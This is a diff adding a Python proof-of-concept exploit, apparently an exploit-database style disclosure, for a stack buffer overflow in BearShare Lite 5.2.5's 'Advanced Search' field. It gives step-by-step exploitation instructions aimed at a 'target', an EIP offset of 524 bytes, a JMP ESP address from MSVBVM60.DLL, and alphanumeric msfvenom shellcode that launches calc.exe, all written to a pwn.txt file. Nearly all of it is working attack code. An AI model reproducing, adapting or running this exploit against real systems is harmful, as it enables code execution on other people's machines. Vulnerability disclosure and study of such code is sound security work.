@@ -1,0 +1,40 @@
+# Title: BearShare Lite 5.2.5 - 'Advanced Search'Buffer Overflow in (PoC)
+# Date: 2020-09-29
+# Author: Christian Vierschilling
+# Vendor Homepage: http://www.bearshareofficial.com/
+# Software Link: http://www.oldversion.com.de/windows/bearshare-lite-5-2-5
+# Versions: 5.1.0 - 5.2.5
+# Tested on: Windows 10 x64 EN/DE
+# CVE: NA
+
+# --- EXPLOTATION INSTRUCTIONS --- #
+# 1. Adjust the values for "jmp_esp" and "shellcode" if needed
+# 2. Run the script to generate a file pwn.txt, containing your payload
+# 3. Open pwn.txt on your target (!!) (e.g. in the browser or locally) and copy the contents into the clipboard
+# 4. Start BearShare, click on "Advanced..." and a new window will pop up. Put the payload from pwn.txt into the field "Keywords:" within the new window. Click on "Search" in this window and your payload will be executed.
+
+# --- PAYLOAD CONSTRUCTION --- #
+#!/usr/bin/python
+import binascii
+
+# Detected the offset for overwriting the EIP register using pattern_create and pattern_offset: [*] Exact match at offset 524
+junk1 = 524*"A"
+
+# Address for a JMP ESP instruction found in MSVBVM60.DLL using mona.py (You will probably need to adjust this if using another OS, language etc.)
+# \x66\x06\x05\x35
+jmp_esp = binascii.unhexlify('35050666')
+
+# Using another 4 bytes to align the stack for clean shellcode execution
+junk2 = 4*"B"
+
+# As we are limited to only being able to insert alphanumeric characters, we'll create an appropriate shellcode using msfvenom. Copy the output off the following command into the variable "shellcode" below:
+# msfvenom -p windows/exec cmd=calc.exe BufferRegister=esp -e x86/alpha_mixed
+shellcode = "TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIylm8k2s0C0ePsPmYKUFQKpu4nk2ptpLKf26lLK3bTTNk1bexVoH7aZWVuaiollUl3QSLtBTlepyQZofmWqZgIrjRqBrwlKRrvpLK3zgLnkbl4Qt8hc3xc1HQv1lK2ya05QkcLK3ytXzCtzg9LKednkvaN6UaioNLzaZotM7qzgvXkPQeJVEScMIhWKQmq4T5xdChnkcha47qYCPfnkFlpKlKaHeLgqjsnk6dLKc1HPlI0Da4FDqKSkE1V9CjcaYoypcoaO0ZlKTRZKnm3msZ7qnmMUX230s05Pbpe8dqNkPoMWkO9EMkHpmenBcfU8MvnuMmMMKO9EelTFQlEZK0Ikm0puWumk1WuCD2PosZ7p1CyoxU3Se1bLbCDn55qhCUuPAA"
+
+# assemble payload
+payload = junk1 + jmp_esp + junk2 + shellcode
+
+# write payload into pwn.txt
+f = open("pwn.txt", 'w')
+f.write(payload)
+f.close()
